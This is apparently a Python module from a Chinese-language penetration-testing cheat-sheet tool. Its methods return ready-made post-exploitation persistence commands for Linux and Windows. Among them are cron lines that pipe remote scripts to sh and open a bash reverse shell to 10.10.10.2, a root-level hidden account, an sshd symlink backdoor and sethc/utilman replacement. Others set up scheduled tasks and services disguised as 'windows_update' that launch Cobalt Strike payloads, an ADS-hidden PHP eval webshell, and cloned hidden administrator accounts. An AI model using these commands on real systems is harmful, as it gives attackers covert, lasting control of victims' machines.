# encoding: utf8
from config import *


class Shell:
    def __init__(self):
        self.info = {
            'Name': 'Persistence',
            'Author': 'nul1',
            'Update': '2019/7/06',
        }

    def SSHKey(self):
        return """
Metasploit Modules:
    post/linux/manage/sshkey_persistence
        
Step:
    1. ssh-keygen -t rsa (local)
    2. cat id_rsa.pub >> /root/.ssh/authorized_keys (upload)
    3. ssh -i id_rsa root@hostname (local)
"""

    def linux_adduser(self):
        return """
添加root权限账号：
    useradd -o -u 0 -M -s /bin/bash -g 0 -d /home/test god;(echo abc123;sleep 1;echo abc123) | passwd god

用户残留文件：
    /var/mail/god 
    /home/test

删除用户：
    userdel -r -f god
"""

    def Crontab(self):
        return """
每5分钟已root权限运行一次
    echo "*/5 * * * * curl -fsSL http://ip/i.sh | sh" >> /var/spool/cron/root

    echo "*/5 * * * * bash -i >& /dev/tcp/10.10.10.2/4455 0>&1" >> /var/spool/cron/root

    echo "*/5 * * * * /usr/bin/python -c \"import urllib2; exec urllib2.urlopen('http://10.10.10.2:4444/a').read();\"" >> /var/spool/cron/root 

"""

    def Ln(self):
        return """
对sshd建立软连接，任意密码登录
    ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=65521;

Hacker:
    ssh root@hostname -p 65521
"""

    def Shift(self):
        return """
sethc程序替换
    copy c:\windows\explorer.exe c:\windows\system32\sethc.exe
    copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe
    attrib c:\windows\system32\sethc.exe +h
    attrib c:\windows\system32\dllcache\sethc.exe +h

utilman程序替换
    REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe" /t REG_SZ /v Debugger /d "C:\\windows\\system32\\cmd.exe" /f
"""

    def Schtasks(self):
        return """
每分钟执行一次命令（只要当前任务存在就不会多执行，支持重启）
    schtasks /create /sc minute /mo 1 /tn "windows_update" /tr "mshta {0}"

    schtasks /create /sc ONLOGON /F /RL HIGHEST /tn 360update /tr "mshta {0}"


立即执行一次
    schtasks /run /tn windows_update

删除
    schtasks /delete /f /tn windows_update

""".format(cs_hta)

    def Services(self):
        """
        sc create windows_update binpath= "c:/cs.exe"
        sc config windows_update start= auto
        net start windows_update
        sc delete windows_update

        """
        return """
sc create windows_update binpath= "c:/cs.exe"&&sc config windows_update start= auto&&net start windows_update
        
"""

    def Reg(self):
        return """
windows系统的开机项位于注册表的：
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

查询
    reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

    cobalt command：
        reg query x86 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
        reg query x64 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

删除
    reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v windows_update /f

添加启动exe
    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v windows_update /t REG_SZ /d "C:\cs.exe" /f

排查
    autoruns
"""

    def Startup(self):
        return """
copy "C:\\test.exe" "C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_update.exe" /y

attrib "C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_update" +s +h
"""

    def Hide(self):
        return """
windows隐藏文件
    attrib "c:\1.exe" +s +h

利用ADS隐藏webshell
    echo ^<?php @eval($_POST['chopper']);?^> > index.php:hidden.jpg

    排查：
        dir /a

"""

    def windows_adduser(self):
        return """
简单添加隐藏账号
    net user test$ 123!@#qwe /add
    net localgroup administrators test$ /add

克隆账号
    powershell-import powershell-import  /Pentest/Post-Exploitation/Persistence/Create-Clone.ps1
    powershell Create-Clone -u god$ -p 123!@#qwe -cu administrator

    计算机管理、控制面板无用户信息

    登录=administrator用户

"""
